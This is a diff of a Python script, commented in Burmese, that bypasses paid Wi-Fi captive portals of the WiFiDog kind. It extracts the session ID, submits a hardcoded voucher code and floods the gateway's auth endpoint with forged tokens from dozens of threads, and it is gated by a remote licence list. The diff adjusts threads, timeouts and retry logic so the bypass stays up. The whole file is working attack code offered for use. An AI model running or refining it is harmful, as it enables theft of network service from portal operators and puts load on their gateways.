@@ -4,9 +4,9 @@ from datetime import datetime
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# --- CONFIG ---
+# --- MASTER CONFIG ---
 VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"
-GAME_THREADS = 40 
+GAME_THREADS = 35 # လိုင်းမရပ်သွားဖို့ ဒီပမာဏက အငြိမ်ဆုံးပါ
 USER_NAME, EXP_DATE, DAYS_LEFT = "MASTER-USER", "--", "?"
 
 def get_uid():
@@ -28,6 +28,7 @@ def update_status():
                         now = datetime.strptime(t_res.json()['datetime'][:10], '%Y-%m-%d')
                     except: now = datetime.now()
                     DAYS_LEFT = (datetime.strptime(EXP_DATE, '%Y-%m-%d') - now).days
+                    if DAYS_LEFT < 0: os._exit(0)
     except: pass
 
 def banner():
@@ -49,13 +50,13 @@ def turbo_pulse(link):
     while True:
         try:
             start = time.time()
-            requests.get(link, timeout=5, verify=False, headers=headers)
+            # Timeout ကို ၃ စက္ကန့်ပဲ ထားလိုက်လို့ လိုင်းမလေးတော့ပါဘူး
+            requests.get(link, timeout=3, verify=False, headers=headers)
             ms = int((time.time() - start) * 1000)
             print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Turbo >>> [{ms}ms]\033[0m")
-            time.sleep(0.05) 
+            time.sleep(0.08) # လိုင်းမရပ်သွားအောင် Delay ကို နည်းနည်း တိုးထားပါတယ်
         except:
-            time.sleep(1)
-            break
+            time.sleep(0.5) # ပြတ်သွားရင် ချက်ချင်းပြန်ကြိုးစားမယ်
 
 def launch():
     banner()
@@ -64,12 +65,10 @@ def launch():
     
     while True:
         try:
-            # Step 1: Force Bypass - ဆရာကြီး အလိုရှိတဲ့ Logic အတိုင်းပါ
-            print("\033[94m[*] Initializing Master Tunnel...\033[0m")
+            print("\033[94m[*] Bypassing Gateway Path...\033[0m")
             r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
             p_url = r.url
             
-            # Step 2: Extract SID & Gateway
             r1 = session.get(p_url, verify=False, timeout=5)
             m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             n_url = urljoin(p_url, m.group(1)) if m else p_url
@@ -78,7 +77,6 @@ def launch():
             
             if sid:
                 p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
-                # Voucher ဝင်တာကို အတင်းလုပ်မယ်
                 session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                 
                 gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
@@ -86,22 +84,17 @@ def launch():
                 auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
                 
                 banner()
-                print(f"\033[95m[*] ⚡ GAME TUNNEL SECURED. ENJOY PING! ⚡\033[0m")
+                print(f"\033[95m[*] ⚡ MASTER FLOW ACTIVE. STABLE MODE. ⚡\033[0m")
                 for _ in range(GAME_THREADS):
                     threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
                 
-                # လိုင်းငြိမ်နေအောင် ထိန်းထားမယ်
                 while True:
-                    time.sleep(10)
+                    time.sleep(5)
                     try:
-                        if requests.get("http://www.google.com/generate_204", timeout=5).status_code != 204: break
+                        # လိုင်းရှိမရှိ အမြဲစစ်နေမယ်
+                        if requests.get("http://www.google.com/generate_204", timeout=4).status_code != 204: break
                     except: break
-            else:
-                # SID ရှာမတွေ့ရင်တောင် Turbo Mode ကို တန်းသွားဖို့ ကြိုးစားမယ်
-                print("\033[93m[*] Manual Login Detected. Activating Pulse...\033[0m")
-                for _ in range(GAME_THREADS):
-                    threading.Thread(target=turbo_pulse, args=("http://192.168.60.1:2060/wifidog/auth?token=12345",), daemon=True).start()
-                while True: time.sleep(10)
+            time.sleep(2)
         except:
             time.sleep(2)
 
